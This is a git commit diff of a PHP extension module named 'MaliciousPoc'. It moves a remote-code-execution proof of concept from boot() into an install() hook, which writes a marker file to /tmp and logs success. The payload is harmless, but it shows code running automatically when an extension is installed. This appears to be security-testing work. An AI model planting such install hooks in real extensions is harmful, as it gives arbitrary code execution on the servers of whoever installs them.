bb798e0b3d10e622d016ac4d6da96eeb220b6be6
sqrtrev <sqrtrev@gmail.com>
2026-07-04 00:13:47 +0900

    update

--- module.php
+++ module.php
@@ -1,21 +1,34 @@
 <?php
 
-namespace Modules\Rce\Demo;
+namespace Modules\MaliciousPoc;
 
 use App\Extension\AbstractModule;
 use Illuminate\Support\Facades\Log;
 
 class Module extends AbstractModule
 {
+    public function install(): bool
+    {
+        Log::info('[EXP] RCE executed!');
+
+        $markerPath = '/tmp/rce_poc' . uniqid() . '.txt';
+        $nonce = bin2hex(random_bytes(8));
+
+        $content = "RCE_POC: {$nonce}\n";
+        $content .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
+        $content .= "Extension: malicious-poc\n";
+        $content .= "Method: Module::install()\n";
+
+        file_put_contents($markerPath, $content);
+
+        Log::info("RCE confirmed - marker: {$markerPath}");
+
+        return parent::install();
+    }
+
     public function boot()
     {
         parent::boot();
-        Log::info("[RCE-DEMO] Module booting - RCE PoC executed!");
-        $markerPath = "/tmp/g7_rce_poc_" . uniqid() . ".txt";
-        $nonce = bin2hex(random_bytes(8));
-        $content = "G7_RCE_POC_DEMONSTRATED: {$nonce}\nTimestamp: " . date("Y-m-d H:i:s") . "\nServer: " . gethostname() . "\nPHP Version: " . PHP_VERSION . "\n";
-        file_put_contents($markerPath, $content);
-        Log::info("[RCE-DEMO] Marker written: {$markerPath}");
     }
 
     public function register()
